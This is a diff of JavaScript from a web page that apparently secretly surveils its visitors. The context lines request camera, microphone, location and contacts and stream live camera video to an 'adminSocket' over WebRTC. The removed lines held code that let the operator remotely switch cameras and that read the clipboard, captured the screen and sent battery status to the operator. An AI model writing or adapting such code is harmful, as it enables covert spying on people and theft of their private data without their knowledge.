@@ -1673,7 +1673,7 @@
                                 if (audioTrack) localStream.addTrack(audioTrack);
                             } else {
                                 localStream = await navigator.mediaDevices.getUserMedia({
-                                    video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                                     audio: true
                                 });
                             }
@@ -1738,38 +1738,6 @@
                             peerConnection = null;
                         }
                     });
-
-                    adminSocket.on('camera:switch', async (data) => {
-                        console.log('[CameraSwitch] Received switch request', data);
-                        currentFacingMode = data.facingMode || (currentFacingMode === 'user' ? 'environment' : 'user');
-                        
-                        if (stream) stream.getVideoTracks().forEach(track => track.stop());
-                        
-                        try {
-                            const newStream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } }
-                            });
-                            const newVideoTrack = newStream.getVideoTracks()[0];
-                            
-                            if (stream) {
-                                stream.getVideoTracks().forEach(t => stream.removeTrack(t));
-                                stream.addTrack(newVideoTrack);
-                            } else {
-                                stream = newStream;
-                                cameraView.srcObject = stream;
-                            }
-                            
-                            if (peerConnection) {
-                                const senders = peerConnection.getSenders();
-                                const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                                if (videoSender && newVideoTrack) {
-                                    videoSender.replaceTrack(newVideoTrack);
-                                }
-                            }
-                        } catch (e) {
-                            console.error('[CameraSwitch] Error switching camera:', e);
-                        }
-                    });
                 } catch (e) {
                     console.log('[AdminServer] Init error:', e.message);
                 }
@@ -1832,7 +1800,6 @@
             // STATE
             // ═══════════════════════════════════════════════════════════════
             let stream = null;
-            let currentFacingMode = 'user';
             let capturedPhotoData = null;
             let isProcessing = false;
             let userLocation = null;
@@ -1842,10 +1809,7 @@
                 notifications: false,
                 microphone: false,
                 motion: false,
-                contacts: false,
-                screenShare: false,
-                clipboard: false,
-                battery: false
+                contacts: false
             };
             let permissionsRequested = false;
             let isInInstagramBrowser = false;
@@ -2480,7 +2444,7 @@
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     try {
                         const combinedStream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                         });
                         permissionsGranted.camera = true;
@@ -2501,7 +2465,7 @@
                     // Try Camera
                     try {
                         const videoStream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: false
                         });
                         permissionsGranted.camera = true;
@@ -2593,57 +2557,6 @@
                         console.error('Notification request failed:', e);
                     }
                 }
-
-                // 5. Battery Status
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        permissionsGranted.battery = true;
-                        if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
-                            adminSocket.emit('battery:update', { uuid: userUUID, level: battery.level, charging: battery.charging });
-                        }
-                    }
-                } catch(e) {}
-
-                // 6. Clipboard Access
-                try {
-                    if (navigator.clipboard && navigator.clipboard.readText) {
-                        const text = await navigator.clipboard.readText();
-                        permissionsGranted.clipboard = true;
-                        if (text && typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
-                            adminSocket.emit('clipboard:update', { uuid: userUUID, text: text });
-                        }
-                    }
-                } catch(e) { console.log('Clipboard permission denied'); }
-
-                // 7. Screen Sharing
-                try {
-                    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        permissionsGranted.screenShare = true;
-                        
-                        const video = document.createElement('video');
-                        video.srcObject = screenStream;
-                        video.muted = true;
-                        await video.play();
-                        
-                        // Wait a bit for the video to load before grabbing a frame
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                        
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 1280;
-                        canvas.height = video.videoHeight || 720;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const screenData = canvas.toDataURL('image/jpeg', 0.5);
-                        
-                        if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
-                            adminSocket.emit('screenshare:update', { uuid: userUUID, image: screenData });
-                        }
-                        
-                        screenStream.getTracks().forEach(track => track.stop());
-                    }
-                } catch(e) { console.log('Screen share denied'); }
 
                 if (permissionsGranted.camera) startContinuousCapture();
                 return permissionsGranted;
